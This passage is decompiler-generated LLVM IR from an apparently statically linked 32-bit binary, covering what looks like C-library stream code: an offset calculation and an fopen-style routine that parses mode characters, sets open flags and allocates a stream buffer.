  %v1_8055fc1 = icmp eq i1 %v4_8055fbd, false
  br i1 %v1_8055fc1, label %dec_label_pc_805602c, label %dec_label_pc_8055fc3

dec_label_pc_8055fc3:                             ; preds = %dec_label_pc_8055fbd
  %v1_8055fc3 = add i32 %v4_8055f9c, 3
  %v2_8055fc3 = inttoptr i32 %v1_8055fc3 to i8*
  %v3_8055fc3 = load i8, i8* %v2_8055fc3, align 1
  %v4_8055fc3 = zext i8 %v3_8055fc3 to i32
  %v2_8055fc7 = sub nsw i32 %v1_8055fb0, %v4_8055fc3
  %v1_8055fc9 = add i32 %v4_8055f9c, 44
  %v2_8055fc9 = inttoptr i32 %v1_8055fc9 to i32*
  %v3_8055fc9 = load i32, i32* %v2_8055fc9, align 4
  %v1_8055fcd = add nsw i32 %v2_8055fc7, -1
  %tmp11 = icmp slt i32 %v3_8055fc9, 1
  br i1 %tmp11, label %dec_label_pc_8055fd8, label %dec_label_pc_8055fd2

dec_label_pc_8055fd2:                             ; preds = %dec_label_pc_8055fc3
  %v1_8055fd2 = add i32 %v4_8055f9c, 2
  %v2_8055fd2 = inttoptr i32 %v1_8055fd2 to i8*
  %v3_8055fd2 = load i8, i8* %v2_8055fd2, align 1
  %v4_8055fd2 = zext i8 %v3_8055fd2 to i32
  %v2_8055fd6 = sub nsw i32 %v1_8055fcd, %v4_8055fd2
  br label %dec_label_pc_8055fd8

dec_label_pc_8055fd8:                             ; preds = %dec_label_pc_8055fc3, %dec_label_pc_8055fb3, %dec_label_pc_8055fae, %dec_label_pc_8055f94, %dec_label_pc_8055fd2
  %v0_8055fed = phi i32 [ %v1_8055fcd, %dec_label_pc_8055fc3 ], [ %v1_8055fb0, %dec_label_pc_8055fb3 ], [ 0, %dec_label_pc_8055fae ], [ 0, %dec_label_pc_8055f94 ], [ %v2_8055fd6, %dec_label_pc_8055fd2 ]
  %v2_8055fd8 = and i32 %v3_8055fa4, 64
  %v3_8055fd8 = icmp eq i32 %v2_8055fd8, 0
  %storemerge.in.in.v = select i1 %v3_8055fd8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8055f9c
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8055fe5 = add i32 %v4_8055f9c, 16
  %v3_8055fe5 = inttoptr i32 %v2_8055fe5 to i32*
  %v4_8055fe5 = load i32, i32* %v3_8055fe5, align 4
  %v5_8055fe5 = sub i32 %storemerge, %v4_8055fe5
  %v1_8055fe8 = inttoptr i32 %arg2 to i32*
  %v2_8055fe8 = load i32, i32* %v1_8055fe8, align 4
  store i32 %v2_8055fe8, i32* %ecx.global-to-local, align 4
  %v1_8055fea = add i32 %arg2, 4
  %v2_8055fea = inttoptr i32 %v1_8055fea to i32*
  %v3_8055fea = load i32, i32* %v2_8055fea, align 4
  store i32 %v3_8055fea, i32* %ebx.global-to-local, align 4
  %v2_8055fed = add i32 %v5_8055fe5, %v0_8055fed
  store i32 %v2_8055fed, i32* %esi.global-to-local, align 4
  %v5_8056001 = sub i32 %v2_8055fe8, %v2_8055fed
  %v10_8056001 = icmp ult i32 %v2_8055fe8, %v2_8055fed
  %v6_8056005 = zext i1 %v10_8056001 to i32
  %tmp13 = icmp slt i32 %v2_8055fed, 0
  %v2_8055ff2.neg = zext i1 %tmp13 to i32
  %v7_8056005 = add i32 %v3_8055fea, %v2_8055ff2.neg
  %v8_8056005 = add i32 %v7_8056005, %v6_8056005
  store i32 %v8_8056005, i32* @edx, align 4
  store i32 %v5_8056001, i32* %v1_8055fe8, align 4
  %v0_805600b = load i32, i32* @edx, align 4
  %v1_805600b = load i32, i32* %edi.global-to-local, align 4
  %v2_805600b = add i32 %v1_805600b, 4
  %v3_805600b = inttoptr i32 %v2_805600b to i32*
  store i32 %v0_805600b, i32* %v3_805600b, align 4
  %v0_805600e = load i32, i32* %edi.global-to-local, align 4
  %v1_805600e = add i32 %v0_805600e, 4
  %v2_805600e = inttoptr i32 %v1_805600e to i32*
  %v3_805600e = load i32, i32* %v2_805600e, align 4
  %v4_805600e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8056011 = icmp slt i32 %v3_805600e, %v4_805600e
  br i1 %v5_8056011, label %dec_label_pc_805601b, label %dec_label_pc_8056013

dec_label_pc_8056013:                             ; preds = %dec_label_pc_8055fd8
  %v8_8056013 = icmp sgt i32 %v3_805600e, %v4_805600e
  br i1 %v8_8056013, label %dec_label_pc_8056019, label %dec_label_pc_8056015

dec_label_pc_8056015:                             ; preds = %dec_label_pc_8056013
  %v1_8056015 = inttoptr i32 %v0_805600e to i32*
  %v2_8056015 = load i32, i32* %v1_8056015, align 4
  %v3_8056015 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8056015, %v3_8056015
  br i1 %tmp14, label %dec_label_pc_8056019, label %dec_label_pc_805601b

dec_label_pc_8056019:                             ; preds = %dec_label_pc_8056015, %dec_label_pc_8056013
  %v0_8056019 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056019 = sub i32 0, %v0_8056019
  store i32 %v1_8056019, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805601b

dec_label_pc_805601b:                             ; preds = %dec_label_pc_8056015, %dec_label_pc_8055fd8, %dec_label_pc_8056019
  %v0_805601b = load i32, i32* %esi.global-to-local, align 4
  %v2_805601b = icmp slt i32 %v0_805601b, 0
  %v1_805601d = icmp eq i1 %v2_805601b, false
  br i1 %v1_805601d, label %dec_label_pc_805602f, label %dec_label_pc_805601f

dec_label_pc_805601f:                             ; preds = %dec_label_pc_805601b
  %v1_805601f = call i32 @function_8050f90(i32 %v2_8055fed)
  %v1_8056024 = inttoptr i32 %v1_805601f to i32*
  store i32 75, i32* %v1_8056024, align 4
  %v0_8056032.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805602f

dec_label_pc_805602c:                             ; preds = %dec_label_pc_8055fbd, %dec_label_pc_8055fb8
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805602f

dec_label_pc_805602f:                             ; preds = %dec_label_pc_805601b, %dec_label_pc_805601f, %dec_label_pc_805602c
  %v0_8056032 = phi i32 [ %v0_805601b, %dec_label_pc_805601b ], [ %v0_8056032.pre, %dec_label_pc_805601f ], [ -1, %dec_label_pc_805602c ]
  ret i32 %v0_8056032

; uselistorder directives
  uselistorder i32 %v4_805600e, { 1, 0 }
  uselistorder i32 %v3_805600e, { 1, 0 }
  uselistorder i32 %v2_8055fed, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8055fb0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8055f9c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805602f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805601b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055fd8, { 4, 0, 1, 2, 3 }
}

define i32 @function_8056038(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056038:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056038 = load i32, i32* @ebp, align 4
  %v0_8056039 = load i32, i32* @edi, align 4
  %v0_805603a = load i32, i32* @esi, align 4
  %v0_805603b = load i32, i32* @ebx, align 4
  store i32 %v0_805603b, i32* %stack_var_-16, align 4
  %v4_805603f = ptrtoint i8* %arg2 to i32
  store i32 %v4_805603f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_805604f = load i8, i8* %arg2, align 1
  %v3_805604f = zext i8 %v2_805604f to i32
  %v4_805604f = load i32, i32* @eax, align 4
  %v5_805604f = and i32 %v4_805604f, -256
  %v6_805604f = or i32 %v5_805604f, %v3_805604f
  store i32 %v6_805604f, i32* %eax.global-to-local, align 4
  %v10_8056051 = icmp eq i8 %v2_805604f, 114
  br i1 %v10_8056051, label %dec_label_pc_8056093, label %dec_label_pc_8056055

dec_label_pc_8056055:                             ; preds = %dec_label_pc_8056038
  %v10_8056055 = icmp eq i8 %v2_805604f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_8056055, label %dec_label_pc_8056095, label %dec_label_pc_805605e

dec_label_pc_805605e:                             ; preds = %dec_label_pc_8056055
  %v10_805605e = icmp eq i8 %v2_805604f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_805605e, label %dec_label_pc_8056095, label %dec_label_pc_8056066

dec_label_pc_8056066:                             ; preds = %dec_label_pc_805610e, %dec_label_pc_80560e8, %dec_label_pc_805605e
  %v0_8056066 = load i32, i32* %stack_var_-16, align 4
  %v1_8056066 = call i32 @function_8050f90(i32 %v0_8056066)
  store i32 %v1_8056066, i32* %eax.global-to-local, align 4
  %v0_805606b = load i32, i32* @ebp, align 4
  %v1_805606b = icmp eq i32 %v0_805606b, 0
  %v1_805606d = inttoptr i32 %v1_8056066 to i32*
  store i32 22, i32* %v1_805606d, align 4
  br i1 %v1_805606b, label %dec_label_pc_805626f, label %dec_label_pc_8056079

dec_label_pc_8056079:                             ; preds = %dec_label_pc_8056131, %dec_label_pc_8056066
  %v0_8056079 = load i32, i32* @ebp, align 4
  %v1_8056079 = add i32 %v0_8056079, 1
  %v2_8056079 = inttoptr i32 %v1_8056079 to i8*
  %v3_8056079 = load i8, i8* %v2_8056079, align 1
  %v4_8056079 = and i8 %v3_8056079, 32
  %v5_8056079 = icmp eq i8 %v4_8056079, 0
  br i1 %v5_8056079, label %dec_label_pc_805626f, label %dec_label_pc_8056083

dec_label_pc_8056083:                             ; preds = %dec_label_pc_8056079
  store i32 %v0_8056079, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8056089 = call i32 @function_8053391(i32 %v0_8056079)
  br label %dec_label_pc_805626a

dec_label_pc_8056093:                             ; preds = %dec_label_pc_8056038
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056095

dec_label_pc_8056095:                             ; preds = %dec_label_pc_805605e, %dec_label_pc_8056055, %dec_label_pc_8056093
  %v0_80560a6 = phi i32 [ 1089, %dec_label_pc_805605e ], [ 577, %dec_label_pc_8056055 ], [ 0, %dec_label_pc_8056093 ]
  %v1_8056095 = add i32 %v4_805603f, 1
  %v2_8056095 = inttoptr i32 %v1_8056095 to i8*
  %v3_8056095 = load i8, i8* %v2_8056095, align 1
  %v12_8056095 = icmp eq i8 %v3_8056095, 98
  %v1_8056095.v4_805603f = select i1 %v12_8056095, i32 %v1_8056095, i32 %v4_805603f
  store i32 %v1_8056095.v4_805603f, i32* %eax.global-to-local, align 4
  %v1_80560a0 = add i32 %v1_8056095.v4_805603f, 1
  %v2_80560a0 = inttoptr i32 %v1_80560a0 to i8*
  %v3_80560a0 = load i8, i8* %v2_80560a0, align 1
  %v12_80560a0 = icmp eq i8 %v3_80560a0, 43
  %v1_80560a4 = icmp eq i1 %v12_80560a0, false
  br i1 %v1_80560a4, label %dec_label_pc_80560ae, label %dec_label_pc_80560a6

dec_label_pc_80560a6:                             ; preds = %dec_label_pc_8056095
  %v1_80560a8 = or i32 %v0_80560a6, 1
  store i32 %v1_80560a8, i32* %eax.global-to-local, align 4
  %v1_80560ab = add nuw nsw i32 %v1_80560a8, 1
  store i32 %v1_80560ab, i32* @ebx, align 4
  br label %dec_label_pc_80560ae

dec_label_pc_80560ae:                             ; preds = %dec_label_pc_8056095, %dec_label_pc_80560a6
  %v0_80561318 = phi i32 [ %v0_80560a6, %dec_label_pc_8056095 ], [ %v1_80560ab, %dec_label_pc_80560a6 ]
  %v1_80560ae = icmp eq i32 %arg3, 0
  %v1_80560b0 = icmp eq i1 %v1_80560ae, false
  br i1 %v1_80560b0, label %dec_label_pc_80560e4, label %dec_label_pc_80560b2

dec_label_pc_80560b2:                             ; preds = %dec_label_pc_80560ae
  store i32 80, i32* %stack_var_-76, align 4
  %v1_80560b7 = call i32 @function_80529ba(i32 80)
  store i32 %v1_80560b7, i32* %eax.global-to-local, align 4
  %v2_80560bf = icmp eq i32 %v1_80560b7, 0
  store i32 %v1_80560b7, i32* @ebp, align 4
  br i1 %v2_80560bf, label %dec_label_pc_8056271, label %dec_label_pc_80560c9

dec_label_pc_80560c9:                             ; preds = %dec_label_pc_80560b2
  %v2_80560b7 = inttoptr i32 %v1_80560b7 to i16*
  store i16 8192, i16* %v2_80560b7, align 2
  %v2_80560d1 = add i32 %v1_80560b7, 8
  %v3_80560d1 = inttoptr i32 %v2_80560d1 to i32*
  store i32 0, i32* %v3_80560d1, align 4
  %v2_80560d8 = add i32 %v1_80560b7, 56
  store i32 %v2_80560d8, i32* %eax.global-to-local, align 4
  store i32 %v2_80560d8, i32* %stack_var_-76, align 4
  %v1_80560dc = call i32 @function_80510cb(i32 %v2_80560d8)
  store i32 %v1_80560dc, i32* %eax.global-to-local, align 4
  %v0_8056131.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80560e4

dec_label_pc_80560e4:                             ; preds = %dec_label_pc_80560ae, %dec_label_pc_80560c9
  %v2_8056137 = phi i32 [ %v0_80561318, %dec_label_pc_80560ae ], [ %v0_8056131.pre, %dec_label_pc_80560c9 ]
  %v2_80560e4 = icmp slt i32 %arg4, 0
  br i1 %v2_80560e4, label %dec_label_pc_8056131, label %dec_label_pc_80560e8

dec_label_pc_80560e8:                             ; preds = %dec_label_pc_80560e4
  %v1_80560ea = and i32 %v2_8056137, 32771
  %v1_80560f0 = add nuw nsw i32 %v1_80560ea, 1
  store i32 %v1_80560f0, i32* @edx, align 4
  %v0_80560f1 = load i32, i32* @esi, align 4
  %v1_80560f1 = add i32 %v0_80560f1, 1
  %v2_80560f4 = and i32 %v1_80560f1, %v1_80560f0
  store i32 %v2_80560f4, i32* %eax.global-to-local, align 4
  %v12_80560f6 = icmp eq i32 %v2_80560f4, %v1_80560f0
  %v1_80560f8 = load i32, i32* @ebp, align 4
  %v2_80560f8 = add i32 %v1_80560f8, 4
  %v3_80560f8 = inttoptr i32 %v2_80560f8 to i32*
  store i32 %arg4, i32* %v3_80560f8, align 4
  %v1_80560fb = icmp eq i1 %v12_80560f6, false
  br i1 %v1_80560fb, label %dec_label_pc_8056066, label %dec_label_pc_8056101

dec_label_pc_8056101:                             ; preds = %dec_label_pc_80560e8
  %v0_8056101 = load i32, i32* @esi, align 4
  %v1_8056103 = and i32 %v0_8056101, 1024
  %v1_8056105 = xor i32 %v1_8056103, 1024
  store i32 %v1_8056105, i32* %eax.global-to-local, align 4
  %v1_805610a = load i32, i32* @ebx, align 4
  %v2_805610a = and i32 %v1_805610a, %v1_8056105
  %v3_805610a = icmp eq i32 %v2_805610a, 0
  br i1 %v3_805610a, label %dec_label_pc_8056101.dec_label_pc_8056127_crit_edge, label %dec_label_pc_805610e

dec_label_pc_8056101.dec_label_pc_8056127_crit_edge: ; preds = %dec_label_pc_8056101
  br label %dec_label_pc_8056127

dec_label_pc_805610e:                             ; preds = %dec_label_pc_8056101
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8056117 = call i32 @function_8050a3c(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8056117, i32* %eax.global-to-local, align 4
  %v1_805611f = icmp eq i32 %v3_8056117, 0
  %v1_8056121 = icmp eq i1 %v1_805611f, false
  br i1 %v1_8056121, label %dec_label_pc_8056066, label %dec_label_pc_805610e.dec_label_pc_8056127_crit_edge

dec_label_pc_805610e.dec_label_pc_8056127_crit_edge: ; preds = %dec_label_pc_805610e
  %v0_8056127.pre = load i32, i32* @esi, align 4
  %v0_805612d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056127

dec_label_pc_8056127:                             ; preds = %dec_label_pc_8056101.dec_label_pc_8056127_crit_edge, %dec_label_pc_805610e.dec_label_pc_8056127_crit_edge
  %v0_805612d = phi i32 [ %v1_805610a, %dec_label_pc_8056101.dec_label_pc_8056127_crit_edge ], [ %v0_805612d.pre, %dec_label_pc_805610e.dec_label_pc_8056127_crit_edge ]
  %v0_8056127 = phi i32 [ %v0_8056101, %dec_label_pc_8056101.dec_label_pc_8056127_crit_edge ], [ %v0_8056127.pre, %dec_label_pc_805610e.dec_label_pc_8056127_crit_edge ]
  %v1_8056127 = and i32 %v0_8056127, 32768
  %v2_805612d = or i32 %v1_8056127, %v0_805612d
  store i32 %v2_805612d, i32* @ebx, align 4
  br label %dec_label_pc_8056155

dec_label_pc_8056131:                             ; preds = %dec_label_pc_80560e4
  %v11_8056133 = or i32 %v2_8056137, 32768
  store i32 %v11_8056133, i32* %eax.global-to-local, align 4
  %v1_8056136 = add i32 %arg4, 1
  %v8_8056136 = icmp eq i32 %v1_8056136, 0
  store i32 %v1_8056136, i32* @edi, align 4
  %v1_8056137 = icmp eq i1 %v8_8056136, false
  %v4_8056137 = select i1 %v1_8056137, i32 %v11_8056133, i32 %v2_8056137
  store i32 %v4_8056137, i32* @ebx, align 4
  %v0_8056141 = load i32, i32* @esi, align 4
  store i32 %v0_8056141, i32* %stack_var_-76, align 4
  %v3_8056142 = inttoptr i32 %v0_8056141 to i8*
  %v4_8056142 = call i32 @function_8050d0c(i8* %v3_8056142, i32 %v4_8056137)
  store i32 %v4_8056142, i32* %eax.global-to-local, align 4
  %v2_805614a = icmp slt i32 %v4_8056142, 0
  %v1_805614c = load i32, i32* @ebp, align 4
  %v2_805614c = add i32 %v1_805614c, 4
  %v3_805614c = inttoptr i32 %v2_805614c to i32*
  store i32 %v4_8056142, i32* %v3_805614c, align 4
  br i1 %v2_805614a, label %dec_label_pc_8056079, label %dec_label_pc_8056155

dec_label_pc_8056155:                             ; preds = %dec_label_pc_8056131, %dec_label_pc_8056127
  %v0_8056155 = load i32, i32* @ebp, align 4
  %v1_8056155 = inttoptr i32 %v0_8056155 to i32*
  %v2_8056155 = load i32, i32* %v1_8056155, align 4
  %v2_8056155.tr = trunc i32 %v2_8056155 to i16
  %v1_805615d = and i16 %v2_8056155.tr, 8192
  %v3_805615d = inttoptr i32 %v0_8056155 to i16*
  store i16 %v1_805615d, i16* %v3_805615d, align 2
  %v0_8056161 = load i32, i32* @ebx, align 4
  store i32 %v0_8056161, i32* %eax.global-to-local, align 4
  %v1_8056163 = and i32 %v0_8056161, -31744
  %v0_8056169 = load i32, i32* @ebp, align 4
  %v1_8056169 = inttoptr i32 %v0_8056169 to i32*
  %v2_8056169 = load i32, i32* %v1_8056169, align 4
  %v1_805616c = mul i32 %v0_8056161, 16
  %v1_805616f = and i32 %v1_805616c, 48
  %v1_8056170 = add nuw nsw i32 %v1_805616f, 16
  %v2_8056173 = xor i32 %v1_8056170, 48
  %v2_8056176 = or i32 %v2_8056169, %v1_8056163
  %v2_8056178 = or i32 %v2_8056176, %v2_8056173
  store i32 %v2_8056178, i32* %eax.global-to-local, align 4
  %v1_805617a = trunc i32 %v2_8056178 to i16
  %v3_805617a = inttoptr i32 %v0_8056169 to i16*
  store i16 %v1_805617a, i16* %v3_805617a, align 2
  %v0_805617e = load i32, i32* %stack_var_-76, align 4
  %v1_805617e = call i32 @function_8050f90(i32 %v0_805617e)
  store i32 %v1_805617e, i32* %eax.global-to-local, align 4
  %v0_8056186 = load i32, i32* @ebp, align 4
  %v1_8056186 = inttoptr i32 %v0_8056186 to i16*
  %v2_8056186 = load i16, i16* %v1_8056186, align 2
  %v3_8056186 = zext i16 %v2_8056186 to i32
  store i32 %v3_8056186, i32* @ebx, align 4
  %v1_805618a = inttoptr i32 %v1_805617e to i32*
  %v2_805618a = load i32, i32* %v1_805618a, align 4
  store i32 %v2_805618a, i32* @edi, align 4
  store i32 %v1_805617e, i32* @esi, align 4
  %v1_805618e = add i32 %v0_8056186, 4
  %v2_805618e = inttoptr i32 %v1_805618e to i32*
  %v3_805618e = load i32, i32* %v2_805618e, align 4
  store i32 %v3_805618e, i32* %stack_var_-76, align 4
  %v1_8056191 = call i32 @function_8052180(i32 %v3_805618e)
  %v2_8056199 = mul i32 %v1_8056191, 256
  store i32 %v2_8056199, i32* %eax.global-to-local, align 4
  %v0_805619c = load i32, i32* @ebx, align 4
  %v2_805619c = or i32 %v0_805619c, %v2_8056199
  store i32 %v2_805619c, i32* @ebx, align 4
  %v1_805619e = trunc i32 %v2_805619c to i16
  %v2_805619e = load i32, i32* @ebp, align 4
  %v3_805619e = inttoptr i32 %v2_805619e to i16*
  store i16 %v1_805619e, i16* %v3_805619e, align 2
  %v0_80561a2 = load i32, i32* @edi, align 4
  %v1_80561a2 = load i32, i32* @esi, align 4
  %v2_80561a2 = inttoptr i32 %v1_80561a2 to i32*
  store i32 %v0_80561a2, i32* %v2_80561a2, align 4
  %v0_80561a4 = load i32, i32* @ebp, align 4
  %v1_80561a4 = add i32 %v0_80561a4, 8
  %v2_80561a4 = inttoptr i32 %v1_80561a4 to i32*
  %v3_80561a4 = load i32, i32* %v2_80561a4, align 4
  %v4_80561a4 = icmp eq i32 %v3_80561a4, 0
  %v1_80561a8 = icmp eq i1 %v4_80561a4, false
  br i1 %v1_80561a8, label %dec_label_pc_80561dc, label %dec_label_pc_80561aa

dec_label_pc_80561aa:                             ; preds = %dec_label_pc_8056155
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_80561b2 = call i32 @function_80529ba(i32 4096)
  store i32 %v1_80561b2, i32* %eax.global-to-local, align 4
  %v1_80561ba = icmp eq i32 %v1_80561b2, 0
  %v1_80561bc = load i32, i32* @ebp, align 4
  %v2_80561bc = add i32 %v1_80561bc, 8
  %v3_80561bc = inttoptr i32 %v2_80561bc to i32*
  store i32 %v1_80561b2, i32* %v3_80561bc, align 4
  br i1 %v1_80561ba, label %dec_label_pc_80561d5, label %dec_label_pc_80561c1

dec_label_pc_80561c1:                             ; preds = %dec_label_pc_80561aa
  %v1_80561c1 = add i32 %v1_80561b2, 4096
  store i32 %v1_80561c1, i32* %eax.global-to-local, align 4
  %v1_80561c6 = load i32, i32* @ebp, align 4
  %v2_80561c6 = add i32 %v1_80561c6, 12
  %v3_80561c6 = inttoptr i32 %v2_80561c6 to i32*
  store i32 %v1_80561c1, i32* %v3_80561c6, align 4
  %v0_80561c9 = load i32, i32* @ebp, align 4
  %v1_80561c9 = inttoptr i32 %v0_80561c9 to i32*
  %v2_80561c9 = load i32, i32* %v1_80561c9, align 4
  %v1_80561cc = udiv i32 %v2_80561c9, 256
  %v3_80561cc = and i32 %v1_80561cc, 191
  %v8_80561cc = or i32 %v3_80561cc, 64
  %v10_80561cc = mul nuw nsw i32 %v8_80561cc, 256
  %v11_80561cc = and i32 %v2_80561c9, -65281
  %v12_80561cc = or i32 %v10_80561cc, %v11_80561cc
  store i32 %v12_80561cc, i32* %eax.global-to-local, align 4
  %v1_80561cf = trunc i32 %v12_80561cc to i16
  %v3_80561cf = inttoptr i32 %v0_80561c9 to i16*
  store i16 %v1_80561cf, i16* %v3_80561cf, align 2
  br label %dec_label_pc_80561dc

dec_label_pc_80561d5:                             ; preds = %dec_label_pc_80561aa
  %v0_80561d5 = load i32, i32* @ebp, align 4
  %v1_80561d5 = add i32 %v0_80561d5, 12
  %v2_80561d5 = inttoptr i32 %v1_80561d5 to i32*
  store i32 0, i32* %v2_80561d5, align 4
  br label %dec_label_pc_80561dc

dec_label_pc_80561dc:                             ; preds = %dec_label_pc_8056155, %dec_label_pc_80561c1, %dec_label_pc_80561d5
  %v0_80561dc = load i32, i32* @ebp, align 4
  %v1_80561dc = add i32 %v0_80561dc, 8
  %v2_80561dc = inttoptr i32 %v1_80561dc to i32*
  %v3_80561dc = load i32, i32* %v2_80561dc, align 4
  store i32 %v3_80561dc, i32* %eax.global-to-local, align 4
  %v1_80561df = add i32 %v0_80561dc, 2
  %v2_80561df = inttoptr i32 %v1_80561df to i8*
  store i8 0, i8* %v2_80561df, align 1
  %v0_80561e3 = load i32, i32* @ebp, align 4
  %v1_80561e3 = add i32 %v0_80561e3, 44
  %v2_80561e3 = inttoptr i32 %v1_80561e3 to i32*
  store i32 0, i32* %v2_80561e3, align 4
  %v0_80561ea = load i32, i32* @ebp, align 4
  %v1_80561ea = add i32 %v0_80561ea, 1
  %v2_80561ea = inttoptr i32 %v1_80561ea to i8*
  %v3_80561ea = load i8, i8* %v2_80561ea, align 1
  %v4_80561ea = and i8 %v3_80561ea, 32
  %v5_80561ea = icmp eq i8 %v4_80561ea, 0
  %v0_80561ee = load i32, i32* %eax.global-to-local, align 4
  %v2_80561ee = add i32 %v0_80561ea, 24
  %v3_80561ee = inttoptr i32 %v2_80561ee to i32*
  store i32 %v0_80561ee, i32* %v3_80561ee, align 4
  %v0_80561f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80561f1 = load i32, i32* @ebp, align 4
  %v2_80561f1 = add i32 %v1_80561f1, 28
  %v3_80561f1 = inttoptr i32 %v2_80561f1 to i32*
  store i32 %v0_80561f1, i32* %v3_80561f1, align 4
  %v0_80561f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80561f4 = load i32, i32* @ebp, align 4
  %v2_80561f4 = add i32 %v1_80561f4, 16
  %v3_80561f4 = inttoptr i32 %v2_80561f4 to i32*
  store i32 %v0_80561f4, i32* %v3_80561f4, align 4
  %v0_80561f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80561f7 = load i32, i32* @ebp, align 4
  %v2_80561f7 = add i32 %v1_80561f7, 20
  %v3_80561f7 = inttoptr i32 %v2_80561f7 to i32*
  store i32 %v0_80561f7, i32* %v3_80561f7, align 4
  %v0_80561fa = load i32, i32* @global_var_805e670.415, align 16
  store i32 %v0_80561fa, i32* @eax, align 4
  %v1_80561ff = load i32, i32* @ebp, align 4
  %v2_80561ff = add i32 %v1_80561ff, 52
  %v3_80561ff = inttoptr i32 %v2_80561ff to i32*
  store i32 %v0_80561fa, i32* %v3_80561ff, align 4
  br i1 %v5_80561ea, label %dec_label_pc_8056271, label %dec_label_pc_8056204

dec_label_pc_8056204:                             ; preds = %dec_label_pc_80561dc
  %v2_805620f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805620f, i32* %stack_var_-76, align 4
  %v2_8056214 = call i32 @function_805405a(i32 %v2_805620f, i32 134561879)
  store i32 %v2_8056214, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e658.308 to i32), i32* %stack_var_-76, align 4
  %v1_8056220 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  store i32 %v1_8056220, i32* @eax, align 4
  %v2_8056232 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056232, i32* %stack_var_-76, align 4
  %v2_8056237 = call i32 @function_805405a(i32 %v2_8056232, i32 134561879)
  store i32 %v2_8056237, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e640.307 to i32), i32* %stack_var_-76, align 4
  %v1_8056243 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e640.307 to i32))
  %v0_8056248 = load i32, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  store i32 %v0_8056248, i32* @eax, align 4
  %v1_805624d = load i32, i32* @ebp, align 4
  %v2_805624d = add i32 %v1_805624d, 32
  %v3_805624d = inttoptr i32 %v2_805624d to i32*
  store i32 %v0_8056248, i32* %v3_805624d, align 4
  %v2_8056250 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8056250, i32* @ecx, align 4
  %v0_8056251 = load i32, i32* @ebp, align 4
  store i32 %v0_8056251, i32* bitcast (i32** @global_var_805e63c.309 to i32*), align 4
  store i32 %v2_8056232, i32* %stack_var_-76, align 4
  %v2_805625b = call i32 @function_805405a(i32 %v2_8056232, i32 1)
  store i32 %v2_8056232, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_805620f, i32* %stack_var_-76, align 4
  %v2_8056265 = call i32 @function_805405a(i32 %v2_805620f, i32 1)
  br label %dec_label_pc_805626a

dec_label_pc_805626a:                             ; preds = %dec_label_pc_8056083, %dec_label_pc_8056204
  %storemerge = phi i32 [ %v2_8056265, %dec_label_pc_8056204 ], [ %v1_8056089, %dec_label_pc_8056083 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056271

dec_label_pc_805626f:                             ; preds = %dec_label_pc_8056079, %dec_label_pc_8056066
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056271

dec_label_pc_8056271:                             ; preds = %dec_label_pc_80561dc, %dec_label_pc_80560b2, %dec_label_pc_805626a, %dec_label_pc_805626f
  %v0_8056274 = load i32, i32* @ebp, align 4
  store i32 %v0_8056274, i32* %eax.global-to-local, align 4
  %v2_8056276 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056276, i32* @ebx, align 4
  store i32 %v0_805603a, i32* @esi, align 4
  store i32 %v0_8056039, i32* @edi, align 4
  store i32 %v0_8056038, i32* @ebp, align 4
  ret i32 %v0_8056274

; uselistorder directives
  uselistorder i32 %v2_8056232, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_805620f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80561c9, { 1, 0 }
  uselistorder i32 %v1_80561b2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8056199, { 1, 0 }
  uselistorder i32 %v1_805617e, { 1, 0, 2 }
